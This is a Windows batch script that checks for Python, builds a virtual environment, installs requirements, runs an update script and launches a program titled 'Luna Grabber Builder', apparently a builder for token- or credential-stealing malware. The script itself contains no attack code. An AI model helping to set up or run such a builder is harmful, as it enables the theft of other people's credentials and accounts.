@echo off
color 5

title Checking Python Version
python --version > nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed! (Go to https://www.python.org/downloads and install the latest version.^)
    echo Make sure it is added to PATH.
    pause > nul
    exit
)

title Creating Virtual Environment
echo Creating Virtual Environment...
python -m venv .venv

title Installing Requirements
echo Installing Requirements...
.venv\Scripts\python -m pip install --upgrade -r requirements.txt

title Checking for updates
echo Checking for updates...
.venv\Scripts\python tools\update.py

if %errorlevel% equ 0 (
    echo Setup Complete!
    title Luna Grabber Builder
    echo Starting the builder...
    .venv\Scripts\python builder.pyw
) else (
    title Setup Failed
    echo Setup Failed!
    echo Check the error message above.
    pause > nul
)